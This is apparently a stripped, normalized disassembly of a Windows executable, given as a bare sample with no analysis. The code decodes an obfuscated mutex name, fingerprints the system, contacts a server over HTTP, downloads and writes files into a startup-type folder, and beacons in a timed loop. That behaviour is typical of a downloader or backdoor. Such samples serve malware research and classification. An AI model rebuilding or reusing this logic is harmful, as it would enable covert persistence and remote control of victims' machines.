sub_401000
push esi
mov esi rw-data
push 0x11
push esi
call sub_401036
pop ecx
pop ecx
push esi
push 0x0
push 0x1f0001
call [ OpenMutexA@IAT ]
test eax eax
je r-xdata
push esi
push 0x0
push 0x0
call [ CreateMutexA@IAT ]
push 0x1
pop eax
pop esi
retn
xor eax eax
pop esi
retn
sub_401036
xor ecx ecx
cmp [ esp + 0x8 ] ecx
jle r-xdata
retn
mov eax [ esp + 0x4 ]
add eax ecx
mov dl [ eax ]
sub dl cl
xor dl 0x17
add dl 0x13
inc ecx
cmp ecx [ esp + 0x8 ]
mov [ eax ] dl
jl r-xdata
sub_4010c3
mov eax sub_403a58
call _EH_prolog
sub esp 0x6c
push ebx
push esi
push edi
xor esi esi
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x4 ] esi
call sub_401000
cmp eax esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push esi
call Ordinal_MFC42_1134
mov edi [ ebp - 0x14 ]
pop ecx
mov ecx edi
call Ordinal_MFC42_2621
push esi
lea ecx [ ebp - 0x78 ]
call sub_401152
lea eax [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x2
mov [ edi + 0x20 ] eax
call sub_40137f
push esi
call [ exit@IAT ]
push esi
call [ exit@IAT ]
sub_401152
mov eax sub_403a6c
call _EH_prolog
push ecx
push esi
mov esi ecx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esi
push 0x66
call Ordinal_MFC42_324
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call Ordinal_MFC42_1168
mov eax 0x80
push eax
push 0xe
push eax
call Ordinal_MFC42_1146
push eax
call [ LoadIconA@IAT ]
mov ecx [ ebp - 0xc ]
mov [ esi + 0x60 ] eax
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_4011d0
mov eax sub_403a80
call _EH_prolog
push ecx
push ebx
push esi
push edi
mov esi ecx
call Ordinal_MFC42_4710
xor edi edi
push edi
push [ esi + 0x20 ]
call [ GetSystemMenu@IAT ]
push eax
call Ordinal_MFC42_2863
mov ebx eax
cmp ebx edi
je r-xdata
push [ esi + 0x60 ]
mov edi [ SendMessageA@IAT ]
mov ebx 0x80
push 0x1
push ebx
push [ esi + 0x20 ]
call edi
push [ esi + 0x60 ]
push 0x0
push ebx
push [ esi + 0x20 ]
call edi
mov ecx [ ebp - 0xc ]
push 0x1
pop eax
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
lea ecx [ ebp - 0x10 ]
call Ordinal_MFC42_540
push 0x65
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edi
call Ordinal_MFC42_4160
mov eax [ ebp - 0x10 ]
cmp [ eax - 0x8 ] edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call Ordinal_MFC42_800
push edi
push edi
mov edi [ AppendMenuA@IAT ]
push 0x800
push [ ebx + 0x4 ]
call edi
push [ ebp - 0x10 ]
push 0x10
push 0x0
push [ ebx + 0x4 ]
call edi
sub_401277
mov eax sub_403a94
call _EH_prolog
sub esp 0x60
mov eax [ ebp + 0x8 ]
and eax 0xfff0
cmp eax 0x10
jne r-xdata
call Ordinal_MFC42_2379
lea ecx [ ebp - 0x6c ]
call sub_401136
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x6c ]
call Ordinal_MFC42_2514
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x6c ]
call Ordinal_MFC42_641
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x8
sub_4012c6
push ebp
mov ebp esp
sub esp 0x64
push esi
mov esi ecx
push [ esi + 0x20 ]
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov ecx esi
call Ordinal_MFC42_2379
push ebx
push edi
push esi
lea ecx [ ebp - 0x64 ]
call Ordinal_MFC42_470
lea eax [ ebp - 0x64 ]
push 0x0
neg eax
sbb eax eax
and eax [ ebp - 0x60 ]
push eax
push 0x27
push [ esi + 0x20 ]
call [ SendMessageA@IAT ]
mov edi [ GetSystemMetrics@IAT ]
push 0xb
call edi
push 0xc
mov ebx eax
call edi
mov edi eax
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x20 ]
call [ GetClientRect@IAT ]
mov eax [ ebp - 0x4 ]
push [ esi + 0x60 ]
sub eax [ ebp - 0xc ]
sub eax edi
inc eax
cdq
sub eax edx
sar eax 0x1
push eax
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
sub eax ebx
inc eax
cdq
sub eax edx
sar eax 0x1
push eax
push [ ebp - 0x60 ]
call [ DrawIcon@IAT ]
lea ecx [ ebp - 0x64 ]
call Ordinal_MFC42_755
pop edi
pop ebx
jmp r-xdata
pop esi
leave
retn
sub_40137f
mov eax sub_403aa0
call _EH_prolog
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_4013c2
and [ ebp - 0x4 ] 0x0
call sub_40147d
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
call sub_4020d7
sub_4013c2
push 0x8
push rw-data
call sub_4023f8
push 0x21
push rw-data
call sub_4023f8
push 0x8
push rw-data
call sub_4023f8
push 0x8
push rw-data
call sub_4023f8
push 0xa
push rw-data
call sub_4023f8
push 0xd
push rw-data
call sub_4023f8
push 0xb
push rw-data
call sub_4023f8
push 0x7
push rw-data
call sub_4023f8
add esp 0x40
push 0xd
push rw-data
call sub_4023f8
push 0xc
push rw-data
call sub_4023f8
push 0xa
push rw-data
call sub_4023f8
push 0xc
push rw-data
call sub_4023f8
push 0x11
push rw-data
call sub_4023f8
push 0xf
push rw-data
call sub_4023f8
push 0xa
push rw-data
call sub_4023f8
add esp 0x38
retn
sub_40147d
push ebx
mov ebx [ LoadLibraryA@IAT ]
push esi
push edi
push rw-data
call ebx
mov esi [ GetProcAddress@IAT ]
mov edi eax
push rw-data
push edi
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push edi
mov edi [ FreeLibrary@IAT ]
mov [ rw-data ] eax
call edi
push rw-data
call ebx
mov ebx eax
test ebx ebx
jne r-xdata
push rw-data
push ebx
call esi
push ebx
mov [ rw-data ] eax
call edi
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov esi rw-data
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
mov edi rw-data
push esi
push edi
call strcpy
push rw-data
push edi
call strcat
add esp 0x40
mov ebx rw-data
push esi
push ebx
call strcpy
push rw-data
push ebx
call strcat
mov ebx rw-data
push esi
push ebx
call strcpy
push rw-data
push ebx
call strcat
push esi
mov esi rw-data
push esi
call strcpy
push rw-data
push esi
call strcat
add esp 0x30
call sub_401642
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push rw-data
call sub_4016ea
call sub_401728
neg eax
sbb eax eax
push 0x0
neg eax
mov [ rw-data ] eax
call sub_401661
call sub_402415
call sub_401e0a
mov ebx rw-data
push ebx
call sub_401e6c
add esp 0xc
test eax eax
jne r-xdata
push rw-data
push edi
call sub_401eb0
call sub_401f8a
mov esi [ malloc@IAT ]
mov edi 0x2000
push edi
call esi
add esp 0xc
mov [ rw-data ] eax
test eax eax
je r-xdata
push ebx
push esi
call sub_401eb0
pop ecx
pop ecx
push edi
call esi
pop ecx
mov [ rw-data ] eax
xor ecx ecx
test eax eax
setne cl
mov eax ecx
sub_401661
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor ebx ebx
push edi
lea eax [ ebp - 0x4 ]
push ebx
push eax
push ebx
push 0x2001f
push ebx
push rw-data
push ebx
push rw-data
push 0x80000002
call [ RegCreateKeyExA@IAT ]
lea eax [ ebp - 0x8 ]
mov edi rw-data
push eax
push edi
push ebx
mov esi rw-data
push ebx
push esi
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] ebx
pop edi
pop esi
pop ebx
je r-xdata
push ebx
call [ time@IAT ]
push eax
call [ srand@IAT ]
pop ecx
pop ecx
call [ rand@IAT ]
push 0x4
push edi
push 0x4
push ebx
push esi
mov [ rw-data ] eax
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
leave
retn
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
sub_4016ea
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi 0x9c
push edi
push 0x0
push esi
call memset
add esp 0xc
mov [ esi ] edi
mov edi [ GetVersionExA@IAT ]
push esi
call edi
test eax eax
jne r-xdata
call [ GetSystemDefaultLangID@IAT ]
pop edi
mov [ rw-data ] ax
pop esi
retn
push esi
mov [ esi ] 0x94
call edi
sub_401728
push ebp
mov ebp esp
sub esp 0x108
push ebx
push esi
lea eax [ ebp - 0x4 ]
push edi
push eax
xor ebx ebx
push 0x1
push ebx
push rw-data
push 0x80000001
mov [ ebp - 0x8 ] 0x4
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x8 ]
mov esi [ RegQueryValueExA@IAT ]
push eax
push rw-data
push ebx
push ebx
push rw-data
push [ ebp - 0x4 ]
call esi
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
push ebx
push ebx
push rw-data
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] 0x100
call esi
push [ ebp - 0x4 ]
mov esi eax
call [ RegCloseKey@IAT ]
cmp edi ebx
jne r-xdata
cmp esi ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call [ strstr@IAT ]
mov edi eax
pop ecx
cmp edi ebx
pop ecx
je r-xdata
lea edi [ ebp - 0x108 ]
add edi 0x5
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3a
push edi
call [ strchr@IAT ]
mov esi eax
push edi
push rw-data
mov [ esi ] bl
call strcpy
inc esi
push esi
call [ atoi@IAT ]
add esp 0x14
mov [ rw-data ] eax
push 0x1
pop eax
jmp r-xdata
sub_40180b
push ebp
mov ebp esp
mov eax 0x2128
call sub_403820
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call sub_402488
mov edi [ Ordinal_WSOCK32_10@IAT ]
pop ecx
push eax
call edi
xor ebx ebx
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
push ebx
push 0x1
push 0x2
mov [ ebp - 0x10 ] eax
call [ Ordinal_WSOCK32_23@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
xor eax eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0xc ] 0x1
push eax
push 0x8004667e
push esi
call [ Ordinal_WSOCK32_12@IAT ]
cmp [ rw-data ] ebx
mov [ ebp - 0x8 ] 0x3c
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x124 ] esi
mov [ ebp - 0x128 ] 0x1
je r-xdata
mov edi [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
push rw-data
call edi
mov edi eax
mov eax [ rw-data ]
jmp r-xdata
push esi
call [ Ordinal_WSOCK32_3@IAT ]
mov eax ebx
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2128 ]
push [ ebp + 0x24 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_40221c
lea eax [ ebp - 0x2128 ]
push eax
call strlen
push [ ebp + 0x18 ]
mov edi eax
push [ ebp + 0x14 ]
lea eax [ ebp + edi - 0x2128 ]
push eax
call memcpy
mov eax [ ebp + 0x18 ]
add esp 0x28
add edi eax
lea eax [ ebp - 0x2128 ]
push ebx
push edi
push eax
push esi
call [ rw-data ]
cmp [ ebp + 0x24 ] 0x1
jne r-xdata
push eax
mov [ ebp - 0x24 ] 0x2
call [ Ordinal_WSOCK32_9@IAT ]
mov [ ebp - 0x22 ] ax
lea eax [ ebp - 0x24 ]
push 0x10
push eax
push esi
mov [ ebp - 0x20 ] edi
call [ Ordinal_WSOCK32_4@IAT ]
lea ecx [ ebp - 0x8 ]
lea eax [ esi + 0x1 ]
push ecx
lea ecx [ ebp - 0x128 ]
push ebx
push ecx
push ebx
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
call sub_40231d
cmp eax 0xffffffff
pop ecx
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x128 ]
push ebx
push eax
lea eax [ esi + 0x1 ]
push ebx
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jle r-xdata
push esi
call [ Ordinal_WSOCK32_3@IAT ]
cmp eax 0x3e800
jge r-xdata
push 0x1
pop ebx
xor edi edi
mov eax 0x3e800
push ebx
sub eax edi
push eax
mov eax [ ebp + 0x1c ]
add eax edi
push eax
push esi
call [ Ordinal_WSOCK32_16@IAT ]
cmp eax 0xffffffff
je r-xdata
cmp eax ebx
je r-xdata
push esi
call [ Ordinal_WSOCK32_3@IAT ]
mov eax [ ebp + 0x20 ]
push 0x1
mov [ eax ] edi
pop eax
jmp r-xdata
add edi eax
cmp edi 0x3e800
jl r-xdata
lea eax [ ebp - 0x8 ]
push eax
push ebx
lea eax [ ebp - 0x128 ]
push ebx
push eax
lea eax [ esi + 0x1 ]
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jle r-xdata
sub_4019d4
push ecx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
xor edi edi
cmp esi edi
pop ecx
jne r-xdata
lea eax [ esp + 0x8 ]
push edi
push eax
push esi
push edi
push rw-data
push rw-data
push 0x50
push rw-data
call sub_40180b
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push esi
call [ free@IAT ]
pop ecx
mov eax edi
mov eax [ esi ]
push 0x1
mov [ rw-data ] eax
pop edi
movzx eax [ esi + 0x4 ]
mov [ rw-data ] eax
movzx eax [ esi + 0x6 ]
mov [ rw-data ] eax
pop edi
pop esi
pop ecx
retn
sub_401a3e
push ebp
mov ebp esp
sub esp 0x50c
push 0x3e800
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ ebp - 0x4 ] eax
jne r-xdata
push ebx
push esi
mov esi rw-data
push edi
lea eax [ ebp - 0x50c ]
push esi
push eax
call strcpy
push esi
call strlen
mov esi eax
mov edi rw-data
inc esi
push edi
lea eax [ ebp + esi - 0x50c ]
push eax
call strcpy
push edi
call strlen
lea esi [ esi + eax + 0x1 ]
mov edi 0x9c
push edi
push rw-data
lea eax [ ebp + esi - 0x50c ]
push eax
call memcpy
mov ax [ rw-data ]
add esi edi
mov edi rw-data
mov [ ebp + esi - 0x50c ] ax
inc esi
inc esi
cmp [ rw-data ] 0x0
push edi
setne al
mov [ ebp + esi - 0x50c ] al
mov eax [ rw-data ]
inc esi
mov [ ebp + esi - 0x50c ] eax
add esi 0x4
lea eax [ ebp + esi - 0x50c ]
push eax
call strcpy
push edi
call strlen
add esp 0x30
lea esi [ esi + eax + 0x1 ]
call [ rw-data ]
mov ecx 0x36ee80
xor edx edx
mov ebx ecx
mov edi eax
div ebx
mov ebx 0xea60
mov eax edx
xor edx edx
div ebx
xor edx edx
push eax
mov eax edi
div ecx
push eax
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x10c ]
push eax
lea eax [ ebp + esi - 0x50c ]
push eax
call strcpy
lea eax [ ebp - 0x10c ]
push eax
call strlen
lea esi [ esi + eax + 0x1 ]
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call strcpy
push 0x2f
lea eax [ ebp - 0x10c ]
push eax
call [ strrchr@IAT ]
mov edi rw-data
lea ebx [ ebp + esi - 0x50c ]
push edi
push ebx
mov [ ebp - 0x8 ] eax
call strcpy
mov eax [ ebp - 0x8 ]
add esp 0x34
test eax eax
je r-xdata
leave
retn
lea eax [ ebp - 0xc ]
push 0x1
push eax
lea eax [ ebp - 0x50c ]
push [ ebp - 0x4 ]
push esi
push eax
push rw-data
push [ rw-data ]
push [ rw-data ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
call sub_40180b
push [ ebp - 0x4 ]
mov esi eax
call [ free@IAT ]
add esp 0x24
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
and [ eax ] 0x0
lea eax [ ebp - 0x10c ]
push eax
push ebx
call strcat
push edi
call strlen
mov edi eax
lea eax [ ebp - 0x10c ]
push eax
call strlen
add esp 0x10
add eax esi
lea esi [ eax + edi + 0x2 ]
sub_401c0e
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
xor edi edi
cmp esi edi
pop ecx
jne r-xdata
lea eax [ ebp - 0x4 ]
push edi
push eax
push esi
push edi
push rw-data
push rw-data
push 0x50
push rw-data
call sub_40180b
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push esi
call [ free@IAT ]
pop ecx
mov eax edi
push [ ebp - 0x4 ]
push esi
call sub_401c6b
pop ecx
mov edi eax
pop ecx
pop edi
pop esi
leave
retn
sub_401c6b
push ebx
xor ebx ebx
cmp [ esp + 0xc ] ebx
push esi
push edi
jle r-xdata
xor eax eax
mov edi [ esp + 0x10 ]
mov esi rw-data
push esi
call strlen
pop ecx
add eax ebx
mov eax [ eax + edi + 0x1 ]
xor ecx ecx
cmp eax [ rw-data ]
sete cl
mov eax ecx
jmp r-xdata
inc ebx
cmp ebx [ esp + 0x14 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + edi ]
push esi
push eax
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
sub_401cb8
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
xor ebx ebx
lea esi [ edi + edi * 4 + 0x3a98 ]
shl esi 0x1
call [ rw-data ]
test edi edi
mov [ rw-data ] eax
jle r-xdata
push 0x1
pop eax
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax edi
push 0x0
sub eax ebx
push eax
mov eax [ esp + 0x18 ]
add eax ebx
push eax
push [ rw-data ]
call [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebx
retn
add ebx eax
mov eax edi
sub eax ebx
add eax 0xbb8
lea esi [ eax + eax * 4 ]
shl esi 0x1
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
and [ rw-data ] 0x0
push 0x1
call [ Sleep@IAT ]
mov eax esi
dec esi
test eax eax
je r-xdata
jmp r-xdata
cmp ebx edi
jl r-xdata
sub_401d45
push ebp
mov ebp esp
sub esp 0x200
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp [ esi ] 0x41
je r-xdata
push 0x200
lea eax [ ebp - 0x200 ]
push ebx
push eax
call memset
add esp 0xc
push [ esi + 0x1 ]
push 0x1
push rw-data
push [ rw-data ]
push [ rw-data ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
lea eax [ ebp - 0x200 ]
push eax
call sub_40221c
lea eax [ ebp - 0x200 ]
push eax
call strlen
push eax
lea eax [ ebp - 0x200 ]
push eax
call sub_401cb8
add esp 0x24
test eax eax
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0xc ]
push esi
call sub_401cb8
pop ecx
pop ecx
xor eax eax
jmp r-xdata
push [ rw-data ]
mov [ rw-data ] 0x1
mov [ rw-data ] ebx
call [ Ordinal_WSOCK32_3@IAT ]
pop esi
pop ebx
leave
retn
call sub_4024a7
test eax eax
je r-xdata
push 0x1
call [ Sleep@IAT ]
jmp r-xdata
cmp [ rw-data ] ebx
jne r-xdata
sub_401e0a
push ecx
push edi
push 0x3e800
call [ malloc@IAT ]
mov edi eax
pop ecx
test edi edi
je r-xdata
pop edi
pop ecx
retn
push ebx
push esi
xor ebx ebx
mov esi rw-data
push esi
push rw-data
call strcpy
pop ecx
pop ecx
inc ebx
cmp ebx 0xa
jl r-xdata
lea eax [ esp + 0xc ]
push 0x0
push eax
push edi
push 0x0
push rw-data
push rw-data
push 0x50
push esi
call sub_40180b
add esp 0x20
test eax eax
jne r-xdata
jmp r-xdata
push edi
call [ free@IAT ]
pop ecx
pop esi
pop ebx
sub_401e6c
push ebp
mov ebp esp
sub esp 0x104
push 0x1
lea eax [ ebp - 0x104 ]
push 0x18
push eax
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x104 ]
push eax
call strcat
lea eax [ ebp - 0x104 ]
push 0x0
push eax
call [ _access@IAT ]
add esp 0x10
neg eax
sbb eax eax
inc eax
leave
retn
sub_401eb0
push ebp
mov ebp esp
sub esp 0x110
push ebx
push esi
push 0x3e800
call [ malloc@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
pop ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
push edi
lea eax [ ebp - 0x8 ]
push esi
push eax
push ebx
push esi
push rw-data
push [ ebp + 0x8 ]
push 0x50
push rw-data
call sub_40180b
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push [ ebp - 0x4 ]
call [ free@IAT ]
pop ecx
mov eax esi
pop edi
push 0x1
lea eax [ ebp - 0x110 ]
push 0x18
push eax
push esi
call [ SHGetSpecialFolderPathA@IAT ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x110 ]
push eax
call strcat
pop ecx
lea eax [ ebp - 0x110 ]
pop ecx
push esi
push eax
call [ SetFileAttributesA@IAT ]
lea eax [ ebp - 0x110 ]
push eax
call [ DeleteFileA@IAT ]
push esi
push esi
push 0x2
push esi
push esi
lea eax [ ebp - 0x110 ]
push 0x40000000
push eax
call [ rw-data ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0xc ]
push esi
push eax
push [ ebp - 0x8 ]
push ebx
push edi
call [ WriteFile@IAT ]
push edi
mov ebx eax
call [ CloseHandle@IAT ]
cmp ebx esi
je r-xdata
push 0x1
pop esi
sub_401f8a
push ebp
mov ebp esp
sub esp 0x40c
push ebx
push edi
push 0x3e800
call [ malloc@IAT ]
mov edi eax
xor ebx ebx
cmp edi ebx
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
push ebx
push eax
push edi
push ebx
push rw-data
push rw-data
push 0x50
push rw-data
call sub_40180b
add esp 0x20
test eax eax
jne r-xdata
pop edi
pop ebx
leave
retn
mov eax [ ebp - 0x4 ]
push esi
lea esi [ edi - 0x2 ]
mov [ eax + edi ] bl
push edi
call [ free@IAT ]
pop ecx
mov eax ebx
pop esi
cmp esi ebx
je r-xdata
add esi 0x2
push 0xd
push esi
mov [ ebp - 0x8 ] esi
call [ strchr@IAT ]
mov esi eax
pop ecx
cmp esi ebx
pop ecx
je r-xdata
push rw-data
push [ ebp - 0x8 ]
call strcmp
pop ecx
test eax eax
pop ecx
jne r-xdata
mov [ esi ] bl
mov eax [ ebp - 0x4 ]
add eax edi
cmp esi eax
jae r-xdata
lea eax [ ebp - 0x4 ]
push ebx
push eax
push edi
push ebx
push rw-data
push rw-data
push 0x50
push rw-data
call sub_40180b
add esp 0x20
test eax eax
je r-xdata
push 0x1
lea eax [ ebp - 0x40c ]
push 0x18
push eax
push ebx
call [ SHGetSpecialFolderPathA@IAT ]
lea eax [ ebp - 0x40c ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x40c ]
pop ecx
push ebx
push eax
call [ SetFileAttributesA@IAT ]
lea eax [ ebp - 0x40c ]
push eax
call [ DeleteFileA@IAT ]
push ebx
push ebx
push 0x2
push ebx
push ebx
lea eax [ ebp - 0x40c ]
push 0x40000000
push eax
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
lea eax [ ebp - 0xc ]
push ebx
push eax
push [ ebp - 0x4 ]
push edi
push esi
call [ WriteFile@IAT ]
push esi
mov [ ebp - 0x8 ] eax
call [ CloseHandle@IAT ]
cmp [ ebp - 0x8 ] ebx
je r-xdata
push 0x1
pop ebx
sub_4020d7
sub esp 0x408
lea eax [ esp + 0x8 ]
push ebx
push ebp
push esi
mov esi [ GetWindowsDirectoryA@IAT ]
mov ebx 0x400
push edi
push ebx
push eax
call esi
lea eax [ esp + 0x18 ]
push rw-data
push eax
call strcat
mov edi [ DeleteFileA@IAT ]
pop ecx
pop ecx
lea eax [ esp + 0x18 ]
push eax
call edi
lea eax [ esp + 0x18 ]
push ebx
push eax
call esi
lea eax [ esp + 0x18 ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ esp + 0x1c ]
pop ecx
push eax
call edi
mov esi [ Sleep@IAT ]
push 0x1
xor ebx ebx
mov ebp 0x2710
pop edi
push 0x32
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call esi
push rw-data
call sub_401e6c
test eax eax
pop ecx
jne r-xdata
push eax
call [ Ordinal_WSOCK32_3@IAT ]
call sub_4019d4
test eax eax
jne r-xdata
push rw-data
push rw-data
call sub_401eb0
pop ecx
pop ecx
call sub_401a3e
test eax eax
je r-xdata
push 0x249f0
jmp r-xdata
push ebp
call sub_401c0e
test eax eax
je r-xdata
call esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
cmp eax ebx
mov [ rw-data ] ebx
je r-xdata
call sub_4024a7
test eax eax
jne r-xdata
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] edi
push eax
push 0x8004667e
push [ rw-data ]
call [ Ordinal_WSOCK32_12@IAT ]
lea eax [ esp + 0x14 ]
mov [ rw-data ] edi
push eax
push ebx
push ebx
push sub_4029bd
push ebx
push ebx
mov [ rw-data ] bl
call [ CreateThread@IAT ]
mov [ rw-data ] edi
cmp [ rw-data ] ebx
je r-xdata
call sub_4028a8
push edi
call esi
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
sub_40221c
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov edi [ _itoa@IAT ]
lea eax [ ebp - 0xf ]
push 0xa
push eax
push [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3a
call edi
add esp 0xc
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
push [ ebp + 0x14 ]
push esi
call strcat
cmp [ ebp + 0x18 ] 0x1
pop ecx
pop ecx
jne r-xdata
push rw-data
push esi
call strcat
push [ ebp + 0xc ]
push esi
call strcat
lea eax [ ebp - 0x10 ]
push eax
push esi
call strcat
add esp 0x18
mov esi [ ebp + 0x8 ]
push esi
call strcpy
cmp [ rw-data ] 0x0
pop ecx
pop ecx
je r-xdata
push rw-data
push esi
call strcat
push rw-data
push esi
call strcat
push [ ebp + 0xc ]
push esi
call strcat
lea eax [ ebp - 0x10 ]
push eax
push esi
call strcat
push rw-data
push esi
call strcat
add esp 0x28
cmp [ ebp + 0x18 ] 0x1
jne r-xdata
push rw-data
push esi
call strcat
pop ecx
pop ecx
push rw-data
push esi
call strcat
pop ecx
pop ecx
pop edi
pop esi
leave
retn
push rw-data
push esi
call strcat
lea eax [ ebp - 0x10 ]
push 0xa
push eax
push [ ebp + 0x1c ]
call edi
lea eax [ ebp - 0x10 ]
push eax
push esi
call strcat
push rw-data
push esi
call strcat
add esp 0x24
sub_40231d
push ebp
mov ebp esp
mov eax 0x2008
call sub_403820
push ebx
push esi
xor ebx ebx
push edi
mov edi [ Sleep@IAT ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
lea esi [ ebp - 0x2008 ]
or eax 0xffffffff
cmp eax 0xffffffff
jne r-xdata
mov al [ esi ]
cmp al 0xd
je r-xdata
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x4
jge r-xdata
cmp al 0xa
je r-xdata
push 0x1
call edi
mov eax [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
cmp eax 0x1388
jg r-xdata
and [ ebp + ebx - 0x2007 ] 0x0
lea eax [ ebp - 0x2008 ]
push rw-data
push eax
call [ strstr@IAT ]
neg eax
sbb eax eax
pop ecx
and eax 0x2
pop ecx
dec eax
jmp r-xdata
inc ebx
inc esi
cmp ebx 0x2000
ja r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x1
call edi
jmp r-xdata
push 0x0
push 0x1
push esi
push [ ebp + 0x8 ]
call [ Ordinal_WSOCK32_16@IAT ]
test eax eax
je r-xdata
sub_4023cf
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x10 ]
test edx edx
mov [ eax ] edx
jle r-xdata
retn
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
push esi
sub eax ecx
mov esi edx
mov dl [ eax + ecx ]
xor dl 0x23
mov [ ecx ] dl
inc ecx
dec esi
jne r-xdata
pop esi
sub_402415
push ebp
mov ebp esp
sub esp 0x104
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xff
push eax
push rw-data
call [ rw-data ]
mov eax [ ebp - 0x4 ]
push 0xff
and [ eax + rw-data ] 0x0
lea eax [ ebp - 0x104 ]
push eax
